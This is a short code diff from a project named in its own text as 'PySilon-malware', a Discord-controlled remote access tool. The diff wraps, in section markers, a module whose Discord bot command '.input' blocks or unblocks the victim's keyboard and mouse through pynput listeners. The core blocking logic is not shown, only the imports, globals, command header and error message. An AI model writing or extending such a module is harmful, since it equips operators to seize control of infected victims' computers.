@@ -1,9 +1,15 @@
+#<imports>
 from pynput import keyboard, mouse
+import discord
+#</imports>
 
+#<preload>
 input_blocked = None
 keyboard_listener = None
 mouse_listener = None
+#</preload>
 
+#<command>
 @client.command(name="input")
 async def block_input(ctx, argument=None):
     global input_blocked, keyboard_listener, mouse_listener
@@ -55,3 +61,4 @@ async def block_input(ctx, argument=None):
         embed = discord.Embed(title="📛 Error",description='```Syntax: .input <block / unblock>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await ctx.send(embed=embed)
+#</command>
